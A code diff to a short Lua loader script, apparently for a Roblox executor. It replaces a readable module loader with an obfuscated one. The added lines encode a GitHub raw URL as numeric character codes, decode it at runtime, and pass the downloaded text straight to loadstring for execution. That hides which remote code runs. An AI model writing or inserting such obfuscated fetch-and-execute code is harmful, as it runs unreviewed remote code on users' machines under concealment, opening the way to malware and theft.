@@ -1,30 +1,9 @@
-local a = "https://raw."
-local b = "githubusercontent.com/"
-local c = "xiaozeyydsnb/aiill/main/"
+local t={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,120,105,97,111,122,101,121,121,100,115,110,98,47,97,105,105,108,108,47,109,97,105,110,47,108,111,97,100,101,114,46,108,117,97}
 
-local BASE = a..b..c
+local s=""
 
-local function LoadModule(name)
-    local ok,res = pcall(function()
-        return game:HttpGet(BASE .. name .. ".lua")
-    end)
-
-    if not ok then
-        warn("加载失败: "..name)
-        return
-    end
-
-    local fn = loadstring(res)
-
-    if fn then
-        return fn()
-    end
+for _,v in pairs(t) do
+    s=s..string.char(v)
 end
 
-if getgenv().XiaoZeLoaded then
-    return
-end
-
-getgenv().XiaoZeLoaded = true
-
-LoadModule("main")
+loadstring(game:HttpGet(s))()
